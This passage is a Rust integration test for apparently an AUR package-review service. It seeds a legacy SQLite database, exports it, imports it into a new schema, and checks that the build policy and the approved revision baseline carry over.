        "files": old.files.iter().map(|file| json!({"path": file.path, "sha256": file.sha256, "size": file.size, "binary": false, "text": null, "content_base64": file.content_base64})).collect::<Vec<_>>(),
    });
    for statement in [
        "CREATE TABLE administrators (id TEXT PRIMARY KEY, username TEXT, password_hash TEXT, created_at TEXT)",
        "CREATE TABLE package_bases (name TEXT PRIMARY KEY, version TEXT, description TEXT, maintainer TEXT, out_of_date_at INTEGER, outputs_json TEXT, aur_last_modified INTEGER)",
        "CREATE TABLE package_build_policies (package_base TEXT PRIMARY KEY, allow_check INTEGER)",
        "CREATE TABLE package_sync_state (package_base TEXT PRIMARY KEY, last_checked_at TEXT)",
        "CREATE TABLE subscriptions (id TEXT, package_base TEXT, kind TEXT, selected_providers_json TEXT, created_at TEXT, updated_at TEXT)",
        "CREATE TABLE revisions (id TEXT PRIMARY KEY, package_base TEXT, metadata_json TEXT, created_at TEXT)",
        "CREATE TABLE audit_decisions (id TEXT, revision_id TEXT, decision TEXT, decided_by TEXT, rationale TEXT, created_at TEXT)",
        "CREATE TABLE revision_dependencies (revision_id TEXT, dependency_name TEXT, dependency_kind TEXT, target_package_base TEXT, provider_state TEXT, candidates_json TEXT)",
        "INSERT INTO administrators VALUES ('a', 'admin', 'hash', '2026-01-01T00:00:00Z')",
        "INSERT INTO package_bases VALUES ('demo', '1-1', 'Demo', 'someone', NULL, '[\"demo\"]', 100)",
        "INSERT INTO package_build_policies VALUES ('demo', 0)",
        "INSERT INTO subscriptions VALUES ('s', 'demo', 'direct', '{\"virtual\":\"impl-a\"}', '2026-01-01T00:00:00Z', '2026-01-02T00:00:00Z')",
        "INSERT INTO revision_dependencies VALUES ('r1', 'libfoo', 'runtime', 'libfoo', 'resolved', '[]')",
        "INSERT INTO audit_decisions VALUES ('d', 'r1', 'manually_approved', 'admin', '人工核对通过', '2026-01-03T00:00:00Z')",
    ] {
        sqlx::query(statement).execute(&mut legacy).await.unwrap();
    }
    sqlx::query("INSERT INTO revisions VALUES ('r1', 'demo', ?, '2026-01-02T00:00:00Z')")
        .bind(metadata.to_string())
        .execute(&mut legacy)
        .await
        .unwrap();
    legacy.close().await.unwrap();

    let document = state::legacy_export(&format!("sqlite://{}/legacy.db", root.path().display()))
        .await
        .unwrap();
    assert!(document.warnings.is_empty(), "{:?}", document.warnings);
    assert_eq!(document.counts()["revisions"], 1);
    assert_eq!(document.counts()["provider_choices"], 1);
    let target_url = format!("sqlite://{}/new.db", root.path().display());
    let pool = db::connect(&target_url).await.unwrap();
    let mut target = sqlx::SqliteConnection::connect(&target_url).await.unwrap();
    state::import(&mut target, &document).await.unwrap();
    let (allow_check,): (i64,) =
        sqlx::query_as("SELECT allow_check FROM packages WHERE package_base = 'demo'")
            .fetch_one(&pool)
            .await
            .unwrap();
    assert_eq!(allow_check, 0);
    // 下一次 AUR 更新以导入的已批准 revision 为 baseline，不再是首次审查。
    let (_, next_state) = insert_revision(
        &pool,
        &snapshot("demo", 'b', None, "pkgname=demo\nchanged\n"),
        &[],
    )
    .await
    .unwrap()
    .unwrap();
    assert_eq!(next_state, "pending_review");
    let baseline: Option<String> = sqlx::query_scalar(
        "SELECT baseline_revision_id FROM revisions WHERE state = 'pending_review'",
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert_eq!(baseline.as_deref(), Some("r1"));
}
